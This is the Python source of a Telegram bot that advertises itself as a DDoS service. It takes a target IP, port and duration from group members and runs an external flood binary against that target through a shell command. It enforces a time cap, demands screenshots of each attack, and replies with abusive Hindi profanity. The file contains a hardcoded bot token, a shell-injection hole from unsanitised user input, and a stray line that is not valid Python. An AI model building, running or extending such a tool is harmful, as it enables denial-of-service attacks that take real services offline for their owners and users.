#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import requests
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7555897511:AAF1HgbyA8SRCdmOKKpg7er2kwjA_Et5GD8')

# Admin user IDs
admin_id = ["7129010361"]

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Attack settings
ATTACK_LIMIT = 10  # Max attacks per day
𝐌𝐀𝐗 𝘾𝙃𝙐𝘿𝘼𝙄 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!
# Global attack tracker
is_attack_running = False  # Track if an attack is running
pending_feedback = {}  # Users who need to send screenshots

# File to store user data
USER_FILE = "users.txt"

# Load user data
user_data = {}

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset)
                }
    except FileNotFoundError:
        pass

def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running  # Global attack flag
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **👹𝘽𝙆𝙇,🍌 𝘽𝙎𝘿𝙆,🖕 𝙈𝘼𝙏𝙃𝙀𝙍𝘾𝙃𝙊𝘿🚀!! 𝘼𝙋𝙉𝙄 𝙂𝘼𝙉𝘿 𝙈𝙐𝙅𝙃𝙀 𝙈𝙏 𝘿𝙀! 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙄𝙉 𝙅𝘼 𝙆𝙀 𝘿𝙀- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧_𝙤𝙥 !!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **⚡🤬𝙈𝘼𝘾𝙃𝘾𝙃𝙊𝘿 𝘽𝙎𝘿𝙆 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝙏𝙀𝙍𝘼 𝘽𝘼𝘼𝙋 𝙅𝙊𝙄𝙉 𝙆𝘼𝙍𝙂𝘼 𝙃𝘼𝙄! 𝙋𝙀𝙃𝙇𝙀 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝙅𝙊𝙄𝙉 𝙆𝙍 𝙁𝙄𝙍 𝘼𝘼𝙉𝘼🍌! 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧** {CHANNEL_USERNAME} 🔥")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **☠️🔥𝘽𝙆𝙇 𝙈𝘼𝙏𝙃𝙀𝙍𝘾𝙃𝙊𝘿 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝙏𝙀𝙍𝘼 𝘽𝘼𝘼𝙋 𝘿𝙀𝙂𝘼! 🤣𝙋𝙀𝙃𝙇𝙀 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝘿𝙀 𝙁𝙄 𝙇𝙂𝘼𝙉𝘼🚀! 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧** 🔥")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ **🍌𝘾𝙃𝙐𝘿𝘼𝙄 𝘼𝙇𝙍𝙀𝘼𝘿𝙔 𝘾𝙃𝘼𝙇𝙐 𝙃𝘼𝙄! 🤬𝙈𝘼𝙏𝙃𝙀𝙍𝘾𝙃𝙊𝘿 𝙋𝙀𝙃𝙇𝙀 𝙐𝙎𝙆𝙊 𝙋𝙐𝙍𝘼 𝙃𝙊𝙉𝙀 𝘿𝙊 𝙁𝙄𝙍 𝙇𝙂𝘼𝙉𝘼🚀! 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /RS  <IP>. <PORT>  <TIME> 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧 ")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **▁▂▄▅▆▇█ 𝐌𝐀𝐗◇𝘾𝙃𝙐𝘿𝘼𝙄◇𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍◇=◇180𝐬! █▇▆▅▄▂▁**")
        return

    # Mark attack as running
    is_attack_running = True
    pending_feedback[user_id] = True  # Require screenshot

    bot.send_message(message.chat.id, f"🚀 **✅𝘾𝙃𝙐𝘿𝘼𝙄 𝙊𝙉 𝙃𝙊 𝙂𝘼𝙄 𝙃𝘼𝙄✅! 🖕🤬𝘽𝙆𝙇 𝘼𝙂𝙇𝙄 𝘾𝙃𝙐𝘿𝘼𝙄 𝙆𝙍𝙉𝙄 𝙃𝘼𝙄 𝙏𝙊𝙃 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝘿𝙀?⚡! 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧**\n🎯 `{target} : {port}`\n⏳ {time_duration}s")

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
        is_attack_running = False  # Reset flag
        return

    bot.send_message(message.chat.id, "✅ **✅𝘾𝙃𝙐𝘿𝘼𝙄 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿✅!! 𝙈𝘼𝙏𝙃𝙀𝙍𝘾𝙃𝙊𝘿 𝘼𝙂𝘼𝙍 𝙋𝙀𝙃𝙇𝙀 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝙉𝙃𝙄 𝘿𝙄𝙔𝘼 𝙏𝙊 𝘼𝘽 𝘿𝙀!!! 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧** 🚀")

    is_attack_running = False  # Reset flag after attack completes

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        bot.send_message(CHANNEL_USERNAME, f"📸 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n👤 `{user_id}`")

        bot.reply_to(message, " **✅𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃✅! 🖕🖕𝘼𝘽 𝘿𝙐𝘽𝘼𝙍𝘼 𝘾𝙃𝙐𝘿𝘼𝙄 𝙆𝙍 𝙎𝘼𝙆𝙏𝙀 𝙃𝙊! 𝙎𝘾𝙍𝙄𝙋𝙏𝙀𝘿 𝘽𝙔-- @𝙍_𝙎𝘿𝙖𝙣𝙜𝙚𝙧** 🚀")
        del pending_feedback[user_id]
    else:
        bot.reply_to(message, "❌ **𝐘𝐞 𝐀𝐏𝐏𝐑𝐎𝐏𝐑𝐈𝐀𝐓𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟
    
🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**  
💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 **DDOS BOT** 🔥  

🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/ravi_ka_rola) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")

load_users()

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)